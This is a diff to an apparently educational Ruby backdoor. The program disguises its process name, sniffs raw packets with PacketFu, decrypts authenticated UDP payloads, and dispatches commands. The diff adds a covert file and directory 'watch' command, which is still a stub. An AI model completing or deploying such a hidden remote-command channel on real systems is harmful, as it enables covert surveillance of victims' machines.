@@ -25,6 +25,7 @@
 
 require 'packetfu'
 require 'openssl'
+require 'fssm'
 require_relative 'util.rb'
 
 # rename process immediately
@@ -43,12 +44,17 @@ CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
 CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
+DIR = "dir"
+FILE = "file"
 
 ## Functions
 
 def start_listen_server
-  puts "server listening on #{@cfg_pen_protocol}:#{@cfg_pen_port}"
-  filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
+  puts "server listening on #{@cfg_iface}->#{@cfg_pen_protocol}:#{@cfg_pen_port}"
+  #filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
+  # for whatever reason this filter stopped working?
+  filter = "udp"
+  puts filter
   begin
     cap = PacketFu::Capture.new(:iface => @cfg_iface,
       :start => true,
@@ -56,12 +62,12 @@ def start_listen_server
       :filter => filter)
     cap.stream.each do |p|
       pkt =  PacketFu::Packet.parse(p)
-      if @cfg_pen_protocol == TCP
+      if @cfg_pen_protocol == TCP && pkt.udp_dst == @cfg_pen_port
         puts "in TCP mode" #DEBUG
         #check for auth
         #if auth'd parse payload for command
         #do command
-      elsif @cfg_pen_protocol == UDP
+      elsif @cfg_pen_protocol == UDP && pkt.udp_dst == @cfg_pen_port
         puts "in UDP mode" #DEBUG
         payload = decrypt(pkt.payload)
         cmds = payload.split(' ')
@@ -74,17 +80,16 @@ def start_listen_server
             #get resp
             #start other junk for knock and send back
           when MODE_WATCH
-            puts "WATCH command received" #DEBUG
+            if cmds[2] == DIR
+              start_watch(DIR, cmds[3])
+            elsif cmds[2] == FILE
+              start_watch(FILE, cmds[3])
+            end
           end
         else
           next #not auth, skip
         end
       end
-          
-      #look at packets here
-      #check for auth
-      #commands
-
     end
   rescue Exception => e
     puts "error in packet capture"
@@ -104,6 +109,7 @@ end
 
 def start_watch(type, name)
   #type is file or folder
+  puts type
   
 end
 
